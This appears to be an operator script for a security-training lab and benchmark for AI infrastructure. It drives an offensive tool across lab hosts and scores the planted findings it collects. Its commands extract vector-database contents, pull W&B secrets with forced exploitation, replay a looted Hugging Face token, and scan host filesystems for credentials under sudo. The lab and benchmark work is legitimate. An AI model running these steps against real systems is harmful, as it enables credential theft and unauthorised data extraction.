#!/bin/bash
# collect-findings.sh — produce a coverage-complete aipostex findings dataset for
# scoring (reaches 100% of the 170 planted findings). Run ON THE ATTACK BOX.
#
# It reuses verify-aipostex.sh's full command set (preserved via AIPOSTEX_KEEP_RESULTS)
# and adds the few coverage surfaces verify-aipostex does not run by default:
# pgvector, tfserving model metadata, A2A seeded-task history, the fraud-detection
# W&B run-config secrets, and the on-host filesystem secret scans (dev + ml).
# This is the operator "scan everything for the benchmark" pass; attendees instead
# explore interactively and score their own (smaller) output.
#
# Usage:
#   bash collect-findings.sh [results-dir]      # default: ~/lab-results
#   python3 ~/lab/scoring/score.py <results-dir> --strict --contracts --rrr-require-covered
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"
# shellcheck source=lab-scripts/lib/inventory.sh
source "${LAB_DIR}/lib/inventory.sh"
# shellcheck source=lab-scripts/lib/chain-config.sh
source "${LAB_DIR}/lib/chain-config.sh"  # CHAIN_HF_TOKEN for the TGI credential-replay artifact

AIPOSTEX=$(command -v aipostex 2>/dev/null || echo "$HOME/aipostex")
RESULTS="${1:-$HOME/lab-results}"
SSH_OPTS="-o StrictHostKeyChecking=no -o ConnectTimeout=10"
ML=$(inventory_host_ip ailab-ml)
DS=$(inventory_host_ip ailab-ds)
APP=$(inventory_host_ip ailab-app)
DEV=$(inventory_host_ip ailab-dev)

[[ -x "$AIPOSTEX" ]] || { echo "[!] aipostex not found at $AIPOSTEX"; exit 2; }
rm -rf "$RESULTS"; mkdir -p "$RESULTS"
echo "[*] aipostex: $($AIPOSTEX version 2>/dev/null | head -1)"
echo "[*] results:  $RESULTS"

# Ship the binary to the hosts where planted secrets live on disk, so discover-files
# can run there (the only way to reach /home/devuser and /opt/litellm secrets).
for ip in "$DEV" "$ML"; do
    scp $SSH_OPTS "$AIPOSTEX" "labadmin@$ip:~/aipostex" >/dev/null 2>&1 || echo "    [warn] could not ship binary to $ip"
done

keep() { # keep only valid, NON-EMPTY JSON (empty = the command produced no findings)
    python3 -c "import json,sys; d=json.load(open(sys.argv[1])); sys.exit(0 if d else 1)" "$1" 2>/dev/null \
        || { rm -f "$1"; echo "    [skip] $(basename "$1") (no findings / invalid)"; }
}
run() { local name="$1"; shift; "$@" --format json >"$RESULTS/$name.json" 2>/dev/null; keep "$RESULTS/$name.json"; }

echo "[*] (1/3) full verify-aipostex command set (preserved)..."
# verify-aipostex emits the bulk of the dataset via AIPOSTEX_KEEP_RESULTS AND runs
# its own e2e self-checks. A self-check assertion failure does NOT mean the dataset
# is incomplete (the commands still ran), so surface it but don't abort on it — the
# authoritative fail-closed gate is score.py --strict --contracts --rrr-require-covered
# at the end. Only a catastrophic run that produced no dataset is fatal.
AIPOSTEX_KEEP_RESULTS="$RESULTS" bash "${SCRIPT_DIR}/verify-aipostex.sh" --layer all >/tmp/verify-aipostex-collect.log 2>&1
va_rc=$?
if [[ $va_rc -ne 0 ]]; then
    echo "[!] verify-aipostex.sh exited $va_rc (self-check failure(s) below); dataset still collected — score.py is authoritative:"
    grep -aiE '\[.\] .*(fail|✗)' /tmp/verify-aipostex-collect.log | grep -aivE '0 failed' | tail -5 || true
fi
_produced=$(ls "$RESULTS"/*.json 2>/dev/null | wc -l | tr -d ' ')
if [[ "${_produced:-0}" -lt 20 ]]; then
    echo "[!] verify-aipostex produced only ${_produced:-0} artifacts — dataset incomplete, aborting (fail closed)"; exit 3
fi

echo "[*] (2/3) coverage-completing extras..."
# pgvector (postgres trust auth on the lab subnet, db=labdb)
PG="vectordb --type pgvector --target $DS:5432 --db-user postgres --db-name labdb"
run pgvector-enum "$AIPOSTEX" $PG enum
for t in employee_embeddings document_chunks audit_log model_registry; do
    run "pgvector-extract-$t" "$AIPOSTEX" $PG extract --collection "$t" --limit 200
done
run pgvector-search "$AIPOSTEX" $PG search-sensitive --limit 300
# tfserving model metadata (model names are not "common", so probe by known name)
run tfserving-fraud "$AIPOSTEX" tfserving --target "http://$ML:8501" metadata --model acme-fraud-scorer
run tfserving-embed "$AIPOSTEX" tfserving --target "http://$ML:8501" metadata --model acme-embeddings
# A2A seeded task history (tokens live in specific task records on the multiturn agent)
for tid in task-acme-replay-0005 task-acme-toolinject-0006; do
    run "a2a-ts-$tid" "$AIPOSTEX" a2a --target "http://$APP:8101" task-status --task-id "$tid"
done
# W&B run-config secrets in the fraud-detection project (force-exploit scans configs)
run wandb-secrets-fraud "$AIPOSTEX" wandb --target "$ML:8444" secrets --entity acme-ml-team --project fraud-detection --force-exploit
# HF TGI credential-replay TERMINAL proof: replay the looted HF token against the gated
# TGI gateway and require REAL inference (satisfies the required HF TGI contract; the
# chain climax that verify-chain.sh only proves via curl, never as a scored artifact).
run hf-tgi-generate "$AIPOSTEX" huggingface --target "http://$APP:8180" generate \
    --prompt "lab benchmark probe" --header "Authorization: Bearer ${CHAIN_HF_TOKEN}" --force-exploit
# on-host filesystem secrets (devuser is covered by verify-aipostex; add ml /opt/litellm)
ssh $SSH_OPTS -n "labadmin@$ML" "sudo \$HOME/aipostex discover files --path /opt/litellm/ --format json" \
    >"$RESULTS/scan-files-ml-litellm.json" 2>/dev/null
keep "$RESULTS/scan-files-ml-litellm.json"

echo "[*] (3/3) cleaning non-finding artifacts..."
# verify-aipostex also drops report/engagement/text outputs here; keep only valid JSON
for f in "$RESULTS"/*.json; do python3 -c "import json,sys;json.load(open(sys.argv[1]))" "$f" 2>/dev/null || rm -f "$f"; done

echo ""
echo "[+] Collected $(ls "$RESULTS"/*.json 2>/dev/null | wc -l | tr -d ' ') findings files in $RESULTS"
echo ""
echo "[*] scoring (fail closed: --strict --contracts --rrr-require-covered)..."
python3 "${LAB_DIR}/scoring/score.py" "$RESULTS" --strict --contracts --rrr-require-covered
rc=$?
if [[ $rc -eq 0 ]]; then echo "[+] benchmark PASS"; else echo "[!] benchmark FAIL (score.py exit $rc)"; fi
exit $rc
